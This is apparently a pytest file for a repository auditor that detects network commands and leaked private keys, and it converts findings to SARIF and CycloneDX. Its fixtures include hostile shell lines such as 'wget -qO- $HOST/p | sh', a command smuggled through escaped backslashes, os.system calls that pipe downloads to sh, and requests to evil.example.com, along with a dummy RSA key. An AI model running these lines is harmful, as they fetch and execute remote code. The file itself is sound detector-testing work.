"""A shell word is read as the shell hands it over, in the dialect of the file; a converted report names its signer;
one commit gives one report however it was checked out. Each test asserts both halves: the false thing is gone, the
true neighbour stays."""
from __future__ import annotations

import json
import subprocess
import sys
import time
import unicodedata
from dataclasses import asdict
from pathlib import Path

from entrovouch import cbom, key_provenance
from entrovouch.no_egress_auditor import _subject_name, audit
from entrovouch.sarif import to_sarif
from entrovouch.signer import MerkleSigner

REPO = Path(__file__).resolve().parents[1]
PEM = ("-----BEGIN RSA PRIVATE KEY-----\n" + "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n" * 4
       + "-----END RSA PRIVATE KEY-----\n")
BS = "\\"


def _write(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


def _cli(module: str, *args):
    return subprocess.run([sys.executable, "-W", "ignore", "-m", f"entrovouch.{module}", *map(str, args)],
                          cwd=REPO, capture_output=True, text=True, encoding="utf-8")


def _kinds(root: Path, name: str | None = None) -> list[tuple[int, str]]:
    return [(f["line"], f["kind"]) for f in audit(root, label="t").findings if name is None or f["file"] == name]


# ---------------------------------------------------------------- the word the shell hands to Python
def test_an_escaped_backslash_before_a_substitution_leaves_it_to_run(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        "python3 - <<EOF",
        f'x = "{BS}{BS}$(wget -qO- $HOST/p | sh)"',      # the shell keeps one backslash and runs wget
        "EOF",
        f"python3 -c \"x = '{BS}{BS}$(wget -qO- $HOST/p | sh)'\"",
        f"python3 -c \"x = '{BS}$(wget -qO- $HOST/p)'\"",  # an escaped $: no command runs, Python sees text
    ]) + "\n")
    assert _kinds(tmp_path) == [(2, "script-network-command"), (4, "script-network-command")]


def test_python_inside_a_command_substitution_is_read(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        'TEST_VERSION=`python -c "import netmiko; print(netmiko.__version__)"`',
        "echo \"fsspec version: $(python3 -c 'import fsspec; print(fsspec.__version__)')\"",
        "V=$(python -c \"import requests\")",
    ]) + "\n")
    assert _kinds(tmp_path) == [(1, "network-import"), (2, "network-import"), (3, "network-import")]


def test_adjacent_quoted_pieces_are_one_word(tmp_path):
    _write(tmp_path, "a.sh", "python3 -c 'import os; os.system('" + BS + "''wget -qO- \"$H\" | sh'" + BS + "'')'\n")
    assert _kinds(tmp_path) == [(1, "subprocess-shell")]


def test_a_heredoc_is_python_only_for_an_interpreter_given_no_script(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        "docker run -i --rm python bash <<EOF", "wget -iurls.txt", "EOF",
        "sh -s python <<EOF", "curl -Kcfg", "EOF",
        "sudo -u app python3 -u - <<'PY'", "import ftplib", "PY",
        "python3 -W ignore <<'PY'", "import smtplib", "PY",
    ]) + "\n")
    # line 1 runs a container (pulled when it is not here); its body goes to bash, not to Python
    assert _kinds(tmp_path) == [(1, "script-network-command"), (2, "script-network-command"),
                                (5, "script-network-command"), (8, "network-import"), (11, "network-import")]


def test_an_address_in_heredoc_python_the_check_cannot_judge_is_still_reported(tmp_path):
    _write(tmp_path, "a.sh", "python3 - <<'EOF' | sh\nprint(\"wget -qO- https://evil.example.com/p\")\nEOF\n"
                             "python3 - <<'EOF'\nimport requests\nrequests.get('https://evil.example.com/q')\nEOF\n")
    assert _kinds(tmp_path) == [(2, "external-url"), (5, "network-import"), (6, "network-call")]


def test_escapes_are_the_dialect_of_the_file(tmp_path):
    _write(tmp_path, "run.sh", "echo hi^;wget -qO- $H/p\necho hi\\;wget -qO- $H/q\n")
    (tmp_path / "run.bat").write_bytes(b"echo C:\\&curl -o x %H%/p\r\necho a ^& curl https://x.example/q\r\n")
    _write(tmp_path, "run.ps1", "Write-Host hi^; Invoke-WebRequest $env:H\nWrite-Host a `; Invoke-WebRequest $env:H\n")
    assert _kinds(tmp_path, "run.sh") == [(1, "script-network-command"), (2, "script-network-word")]
    assert _kinds(tmp_path, "run.bat") == [(1, "script-network-command"), (2, "script-network-word")]
    assert _kinds(tmp_path, "run.ps1") == [(1, "script-network-command"), (2, "script-network-word")]


def test_a_long_line_takes_linear_time(tmp_path):
    for name, line in (("echo.sh", "echo " + "x curl " * 30000), ("pyc.sh", "python -c 'x' " * 15000)):
        _write(tmp_path / name[:-3], name, line + "\n")
        start = time.perf_counter()
        audit(tmp_path / name[:-3], label="t")
        assert time.perf_counter() - start < 20, name    # 200 KB; quadratic took minutes


# ---------------------------------------------------------------- one commit, one report
def test_a_stand_in_pointing_into_a_skipped_directory_is_a_link_whether_or_not_it_exists(tmp_path):
    for name in ("fresh", "used"):
        _write(tmp_path / name, "bin/eslint", "../node_modules/.bin/eslint")
        _write(tmp_path / name, "lnk.py", "build/gen.py")
        _write(tmp_path / name, "main.py", "import requests\n")
    _write(tmp_path / "used", "node_modules/.bin/eslint", "#!/usr/bin/env node\n")
    _write(tmp_path / "used", "build/gen.py", "x = 1\n")
    fresh, used = audit(tmp_path / "fresh", label="t"), audit(tmp_path / "used", label="t")
    assert fresh.findings_digest == used.findings_digest and fresh.not_scanned["symbolic_links"] == 2
    assert cbom.build_cbom(tmp_path / "fresh", label="t").tree_listing_digest \
        == cbom.build_cbom(tmp_path / "used", label="t").tree_listing_digest


def test_names_equal_after_nfc_are_kept_apart_and_ordered_the_same_way(tmp_path, monkeypatch):
    import entrovouch.manifests as man
    nfc, nfd = unicodedata.normalize("NFC", "é.py"), unicodedata.normalize("NFD", "é.py")
    (tmp_path / nfc).write_text("import requests\n", encoding="utf-8")
    (tmp_path / nfd).write_text("import ftplib\n", encoding="utf-8")
    import os
    if len(os.listdir(tmp_path)) < 2:
        return                                  # a file system that folds the two names keeps one file
    first = audit(tmp_path, label="t")
    real = man.os.walk

    def reversed_walk(*a, **k):
        for dp, dn, fn in real(*a, **k):
            fn.reverse()
            yield dp, dn, fn
    monkeypatch.setattr(man.os, "walk", reversed_walk)
    second = audit(tmp_path, label="t")
    assert first.findings_digest == second.findings_digest
    assert sorted(f["file"] for f in first.findings) == sorted([nfc, nfd]) and nfc != nfd


def test_the_subject_name_is_nfc(tmp_path):
    folder = tmp_path / unicodedata.normalize("NFD", "café")
    folder.mkdir()
    assert _subject_name(folder) == unicodedata.normalize("NFC", "café")


def test_a_file_no_python_can_parse_gives_one_cbom_on_every_interpreter(tmp_path):
    _write(tmp_path, "bad.py", "def (:\n")
    detail = cbom.build_cbom(tmp_path, label="t").files_not_parsed[0]["detail"]
    assert f"{sys.version_info.major}.{sys.version_info.minor}" not in detail and "could not parse" in detail


# ---------------------------------------------------------------- converted reports say who signed and what was read
def test_sarif_names_the_signer_root(tmp_path):
    _write(tmp_path / "t", "a.py", "import requests\n")
    signer = MerkleSigner.create(tmp_path / "k.json", height=3)
    signed = asdict(audit(tmp_path / "t", label="t", signer=signer))
    props = to_sarif(signed)["runs"][0]["properties"]
    assert props["signed"] is True and props["signedBy"] == signed["public_root"] and "--root" in props["signatureChecked"]
    unsigned = to_sarif(asdict(audit(tmp_path / "t", label="t")))["runs"][0]["properties"]
    assert unsigned["signed"] is False and unsigned["signedBy"] is None


def test_sarif_encodes_a_name_that_is_not_utf8(tmp_path):
    report = asdict(audit(tmp_path, label="t"))
    report["findings"] = [{"file": "a\ud800b.py", "line": 1, "kind": "network-import", "detail": "import requests"}]
    uri = to_sarif(report)["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert uri == "a%ED%A0%80b.py"


def test_cyclonedx_refuses_a_cbom_that_read_nothing(tmp_path):
    _write(tmp_path / "empty", "notes.rst", "readme\n")
    _write(tmp_path / "full", "a.py", "import hashlib\nhashlib.md5(b'x')\n")
    for name in ("empty", "full"):
        (tmp_path / f"{name}.json").write_text(json.dumps(asdict(cbom.build_cbom(tmp_path / name, label="t"))),
                                               encoding="utf-8")
    r = _cli("cyclonedx", tmp_path / "empty.json", "--out", tmp_path / "e.cdx")
    assert r.returncode == 2 and "read nothing" in r.stderr and not (tmp_path / "e.cdx").exists()
    assert _cli("cyclonedx", tmp_path / "full.json", "--out", tmp_path / "f.cdx").returncode == 0


def test_timestamp_refuses_a_report_with_a_byte_order_mark_as_verify_does(tmp_path):
    _write(tmp_path / "t", "a.py", "import requests\n")
    body = json.dumps(asdict(audit(tmp_path / "t", label="t")))
    (tmp_path / "plain.json").write_text(body, encoding="utf-8")
    (tmp_path / "bom.json").write_bytes(b"\xef\xbb\xbf" + body.encode("utf-8"))
    assert _cli("timestamp", "request", tmp_path / "plain.json", "--out", tmp_path / "p.tsq").returncode == 0
    r = _cli("timestamp", "request", tmp_path / "bom.json", "--out", tmp_path / "b.tsq")
    assert r.returncode == 2 and "byte-order mark" in r.stderr


# ---------------------------------------------------------------- key material a notebook printed; archives not opened
def test_a_key_printed_into_a_notebook_output_is_found(tmp_path):
    lines = [ln + "\n" for ln in PEM.rstrip("\n").split("\n")]
    _write(tmp_path, "n.ipynb", json.dumps({"nbformat": 4, "cells": [
        {"cell_type": "code", "source": ["print(key)\n"],
         "outputs": [{"output_type": "stream", "name": "stdout", "text": lines}]},
        {"cell_type": "markdown", "source": ["A key begins -----BEGIN RSA PRIVATE KEY----- and is not here.\n"]}]}))
    found = key_provenance.scan_key_provenance(tmp_path, label="t").findings
    assert [(f["line"], f["detail"]) for f in found] == [(1, "-----BEGIN RSA PRIVATE KEY----- in cell 1's saved output")]


def test_an_archive_this_tool_cannot_open_is_named_as_not_opened(tmp_path):
    import gzip
    (tmp_path / "key.pem.gz").write_bytes(gzip.compress(PEM.encode()))      # opened and searched
    (tmp_path / "keys.7z").write_bytes(b"7z\xbc\xaf\x27\x1c" + b"\x00" * 32)   # not opened: named
    _write(tmp_path, "notes.txt", "hello\n")
    rep = key_provenance.scan_key_provenance(tmp_path, label="t")
    assert rep.not_scanned["archives_not_opened"] == ["keys.7z"]
    assert [f["file"] for f in rep.findings] == ["key.pem.gz"]
    assert "Archives not opened (1)" in key_provenance.render_markdown(rep)
